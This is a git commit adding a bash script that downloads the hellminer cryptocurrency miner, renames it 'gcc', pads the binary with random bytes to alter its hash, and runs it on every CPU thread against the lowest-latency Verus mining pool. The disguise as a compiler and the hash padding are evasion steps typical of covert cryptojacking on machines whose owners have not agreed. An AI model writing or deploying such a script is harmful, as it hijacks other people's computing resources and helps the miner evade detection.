733d632b84572c76fb54c751e732b4b61a69f6a8
caippx <37325838+caippx@users.noreply.github.com>
2024-11-28 15:38:41 +0800

    Create wahahah.sh

---
+++ drfytgybhunjoimkol/wahahah.sh
@@ -0,0 +1,41 @@
+#!/bin/bash
+
+address=$1
+worker_name=$2
+threads=$(nproc)
+apt install libsodium23 libsodium-dev -y
+
+urls=("cn.vipor.net" "ussw.vipor.net" "usw.vipor.net" "usw.vipor.net" "us.vipor.net" "ca.vipor.net" "fr.vipor.net" "de.vipor.net" "fi.vipor.net") #vipor
+#urls=("na.luckpool.net" "eu.luckpool.net" "ap.luckpool.net") #luck
+# 初始化最低延迟和最佳URL
+min_latency=1000000
+best_url=""
+
+# 循环测试每个URL
+for url in "${urls[@]}"; do
+  # 使用ping命令测试延迟，提取平均延迟值
+  latency=$(ping -c 4 "$url" | tail -1 | awk -F '/' '{print \$5}')
+  
+  # 检查是否是最低延迟
+  if (( $(echo "$latency < $min_latency" | bc -l) )); then
+    min_latency=$latency
+    best_url=$url
+  fi
+  
+  # 输出每个URL的延迟
+  echo "$url 延迟: $latency ms"
+done
+
+# 输出最低延迟的URL
+echo "最低延迟的URL是: $best_url，延迟: $min_latency ms"
+
+mkdir vrsc && cd vrsc
+wget -O gcc.tar.gz https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64_avx2.tar.gz
+tar -zxvf gcc.tar.gz && rm -rf gcc.tar.gz
+count=$((RANDOM % 100 + 1))
+for ((i = 0; i < count; i++)); do
+  echo -n "0" >> "hellminer"
+done
+mv hellminer gcc
+chmod u+x *
+./gcc -c stratum+ssl://$best_url:5140  -u $address.$worker_name -p x --cpu $threads
